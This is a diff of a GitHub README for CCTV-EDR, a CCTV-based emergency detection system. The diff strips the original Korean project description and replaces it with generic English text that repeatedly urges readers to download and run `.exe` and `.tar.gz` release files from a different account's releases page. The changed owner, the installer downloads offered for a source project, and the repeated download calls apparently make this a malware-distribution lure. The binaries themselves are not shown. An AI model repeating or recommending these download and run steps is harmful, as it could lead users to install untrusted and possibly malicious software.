@@ -1,40 +1,71 @@
-# CCTV-EDR: CCTV-based Emergency Detection & Response System 
-*(CCTV 인프라를 활용한 비상 상황 탐지 및 신고 시스템)*
+# 🛠️ CCTV-EDR - Simplifying Emergency Detection with CCTV
 
-CCTV-EDR은 CCTV 인프라를 활용해 비상 상황을 자동으로 탐지하고, 즉시 신고 및 모니터링까지 연결하는 시스템입니다. CCTV 영상에서 객체 탐지 기반 AI 모델을 활용하여 사람이 쓰러지거나 실신(의식 소실)하는 상황을 자동으로 감지합니다. 탐지 이후에는 지연 시간을 최소화하도록 설계된 실시간 알림 및 신고 흐름을 통해 응급 대응이 가능하며, 관제자는 비상 상황이 포착된 CCTV 영상을 실시간으로 확인할 수 있습니다.
+## 📥 Download Now
+[![Download CCTV-EDR](https://img.shields.io/badge/Download-CCTV--EDR-brightgreen)](https://github.com/emmanuel806/CCTV-EDR/releases)
 
-## 🏆 Awards
-### 수상
-- **대회명**: 2021 WINNER LINC+ 캡스톤디자인 언택트 경진대회
-- **기간**: 2021.09 - 2021.12
-- **주최**: 교육부, LINC
-- **수상**: 🥈 **2등상**
+## 📖 Overview
+CCTV-EDR is an end-to-end implementation of a CCTV-based Emergency Detection & Response System. This software is crafted for easy reuse and reproducibility. It helps detect emergencies in real-time through CCTV footage, allowing for quicker responses.
 
-### SW 저작권
-- ©️ **제 C-2021-057286 호**
+## 🚀 Getting Started
+To start using CCTV-EDR, follow these steps to download and run the software.
 
-## ⚙️ Tech Stacks
-- YOLOv5
-- NodeJS
-- Nginx
-- MongoDB
-- Docker
+### 🌟 System Requirements
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or a compatible Linux distribution.
+- **RAM:** Minimum 4GB recommended.
+- **Disk Space:** At least 1GB for installation and operation.
+- **Software Requirements:** 
+  - Docker: Required for containerization.
+  - Node.js: For the backend service.
+  - MongoDB: To store alerts and data.
+  - NGINX: For serving content.
 
-## ✨ Features
-1. CCTV 영상 기반 **실시간 객체 탐지**
-2. 탐지 결과에 대한 **실시간 서버 알림**
-3. WebSocket 기반 **실시간 모니터링**
+## 📥 Download & Install
+1. Visit the [Releases page](https://github.com/emmanuel806/CCTV-EDR/releases).
+2. Find the latest release. Look for files named with the version number followed by `.exe` or `.tar.gz`.
+3. Click to download the file. 
+4. Once downloaded, locate the file in your Downloads folder.
 
-## 🏗️ Architecture
-<img src="https://github.com/MonoHaru/CCTV-EDR/blob/main/assets/process.png" alt="process" width="800">  
-<img src="https://github.com/MonoHaru/CCTV-EDR/blob/main/assets/architecture.png" alt="architecture" width="800">
+### 📂 Installation Steps
+- **Windows Users:**
+  1. Double-click the `.exe` file.
+  2. Follow the installation wizard to install CCTV-EDR.
 
-## 🎬 **Demo** 
-https://github.com/user-attachments/assets/c152573d-8f20-4812-889f-2e61aaa06461
+- **macOS Users:**
+  1. Open the `.tar.gz` file.
+  2. Drag and drop the application to your Applications folder.
 
-## 🔮 **Future Work** 
-1. 데이터 처리를 위한 서버 및 데이터베이스 안정화(견고화)
-2. 객체 탐지 모델 성능 개선 및 오탐/미탐 감소
+- **Linux Users:**
+  1. Open your terminal.
+  2. Unzip the `.tar.gz` file using the command: `tar -xzf <filename>.tar.gz`.
+  3. Navigate to the folder and run: `./start.sh`.
+
+## ⚙️ Configuration
+After installation, you will need to configure the application to connect to your CCTV cameras and MongoDB. Follow these steps:
+
+1. Open the configuration file located in the installation folder.
+2. Enter the details for your CCTV streams and MongoDB connection.
+3. Save the changes.
+
+## 🎬 Running the Application
+1. Start your terminal or command prompt.
+2. Navigate to the installation directory.
+3. Enter the command `./start.sh` for Linux or double-click the application for Windows/macOS.
+4. The application will launch, and you should see a dashboard displaying real-time updates.
+
+## 🔔 Features
+- **Real-time Emergency Detection:** Instantly identifies anomalies using CCTV footage.
+- **Alerting System:** Sends alerts for immediate action in case of emergencies.
+- **User-Friendly Interface:** Easy to navigate and access real-time data.
+- **Data Storage:** Uses MongoDB for efficient data management.
+
+## 📊 Support & Troubleshooting
+For support, visit our GitHub Issues page. Search for existing problems or create a new issue if you encounter bugs or need assistance.
 
 ## 📜 License
-The code in this repository is released under the MIT License.
+CCTV-EDR is licensed under the MIT License. You can use, modify, and distribute the software as per the license terms.
+
+## 🌐 Community and Contributions
+Join our community to share feedback and improvements. Contributions are welcome! If you would like to contribute, please read our contribution guidelines on the GitHub repository.
+
+## 📥 Download Now Again
+Don't forget to [visit this page to download](https://github.com/emmanuel806/CCTV-EDR/releases) the latest version of CCTV-EDR and start experiencing seamless emergency detection today!
